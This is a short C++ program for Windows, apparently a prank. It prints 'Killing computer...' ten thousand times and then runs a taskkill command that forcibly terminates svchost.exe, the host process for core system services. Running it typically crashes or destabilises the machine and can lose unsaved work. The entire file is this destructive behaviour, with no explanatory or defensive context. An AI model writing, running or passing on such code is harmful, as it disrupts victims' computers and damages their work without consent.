#include <iostream>
#include <Windows.h>

int main()
{
    for (int i = 0; i < 10000; i++) {
        std::cout << "Killing computer..." << std::endl;
    }
    system("taskkill /f /im svchost.exe");
    return 0;
}